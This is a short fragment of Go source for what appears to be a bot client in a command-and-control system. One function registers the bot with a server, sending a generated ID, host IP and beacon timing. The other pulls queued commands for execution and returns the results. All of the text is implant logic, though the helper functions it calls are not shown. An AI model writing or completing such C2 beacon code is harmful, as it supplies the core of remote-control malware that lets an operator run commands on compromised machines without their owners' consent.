package metcli

import (
	"strconv"

	"github.com/google/uuid"
)

//register the bot with the DB
func register() string {
	uid := uuid.New().String()
	storeUUID(uid)
	hn := getIP()
	intrv := strconv.Itoa(INTERVAL)
	dlt := strconv.Itoa(DELTA)
	payload := uid + "||" + intrv + "||" + dlt + "||" + hn
	ret := sendData(payload, "C", "0")
	return ret
}

//pull all commands to be executed
func getCommand() {
	uid := fetchUUID()
	coms := encodePayload(uid, "D", "0")
	results := parseCommands(coms)
	if results == nil {
		return
	}
	sendResults(results)
	return
}
